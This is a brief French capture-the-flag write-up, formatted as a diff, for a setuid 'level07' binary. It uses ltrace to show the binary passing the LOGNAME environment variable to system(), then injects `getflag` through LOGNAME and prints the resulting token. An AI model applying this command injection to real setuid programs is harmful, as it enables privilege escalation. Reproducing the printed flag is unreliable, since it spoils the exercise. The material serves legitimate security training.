@@ -1,0 +1,31 @@
+#On arrive sur le home et on a un fichier binaire setuid
+#En le lancant on voit qu'il nous affiche level07
+#On utilise donc ltrace afin d'obtenir la callstack
+
+ltrace ./level07
+>>>
+__libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                                                                       = 2007
+geteuid()                                                                                                       = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                             = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                             = 0
+getenv("LOGNAME")                                                                                               = "level07"
+asprintf(0xbffff6f4, 0x8048688, 0xbfffff29, 0xb7e5ee55, 0xb7fed280)                                             = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                          = 0
+
+#On vois une premiere fonction getenv qui permet de recuperer une variable d'environement passer en parametre, nous avons notre faille
+
+#Apres quelque test on s'apercoit que le call de systeme est fais de la maniere suivante : system(echo ${LOGNAME})
+
+#Nous voulons donc afficher getflag :
+
+export LOGNAME=\`getflag\`
+
+#Sans oublier les \ pour echapper les backquote.
+#ils nous reste qu'a executer le binaire
+
+./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
